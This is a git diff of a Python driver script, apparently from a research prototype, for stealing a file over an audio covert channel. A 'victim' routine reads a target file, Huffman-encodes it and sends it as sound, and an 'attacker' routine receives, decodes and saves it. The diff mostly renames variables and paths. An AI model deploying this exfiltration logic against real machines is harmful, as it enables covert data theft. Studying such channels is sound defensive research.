@@ -3,46 +3,36 @@ import huffman.freq as freq
 from sound.sound_decoder import *
 import textwrap
 
-FILE_TO_STEAL = '/home/ofir/PycharmProjects/AudioAlpha/tests/myCodes.txt'
-STOLEN_FILE = '/home/ofir/PycharmProjects/AudioAlpha/tests/hisCodes.txt'
+FILE_TO_STEAL = '/home/yaniv/PycharmProjects/AudioAlpha/data/myCodes.txt'
+STOLEN_FILE = '/home/yaniv/PycharmProjects/AudioAlpha/data/hisCodes.txt'
 
-def victim(soundSend,soundRecv):
-    freq_dict = freq.relative_english_freq()
-    freqs = list(freq_dict.items())  # HuffmanCode requires (symbol, freq) pairs.
-    decimal_huffman = huffman.HuffmanCode(freqs, 10)
+def victim(sound_send,sound_recv):
     with open(FILE_TO_STEAL) as f:
         data = f.read()
-    huffman_data = decimal_huffman.encode(data)
+    huffman_data = huffman.huffman_decimal_encode(data)
+    sendAudioPacket(huffman_data, sound_send,sound_recv)
 
-    sendAudioPacket(huffman_data, soundSend,soundRecv)
-
-
-def attacker(soundSend,soundRecv):
-    huffmanData = recvAudioPacket(soundSend,soundRecv)
-
-    if (huffmanData != ''):
-        freq_dict = freq.relative_english_freq()
-        freqs = list(freq_dict.items())  # HuffmanCode requires (symbol, freq) pairs.
-        decimal_huffman = huffman.HuffmanCode(freqs, 10)
-        data = decimal_huffman.decode(huffmanData) #move it from here
-        #move the next section from here
+def attacker(sound_send,sound_recv):
+    huffman_data = recvAudioPacket(sound_send,sound_recv)
+    if (huffman_data != ''):
+        data = huffman.huffman_decimal_decode(huffman_data)
         print(data)
         fd = open(STOLEN_FILE, 'w')
         fd.write(data)
         fd.close()
     else:
-        print('attacker() get huffman_data null')
+        print('attacker() got huffman_data null')
 
 def main():
     # if len(sys.argv) == 2 and sys.argv[1] == 'v':
     #     victim()
     # else:
     #     attacker()
-    soundSend = Encoder()
-    soundRecv = Decoder()
+    sound_send = Encoder()
+    sound_recv = Decoder()
 
-    #victim(soundSend,soundRecv)
-    attacker(soundSend,soundRecv)
+    victim(sound_send,sound_recv)
+    #attacker(sound_send,sound_recv)
 
 if __name__ == "__main__":
    main()
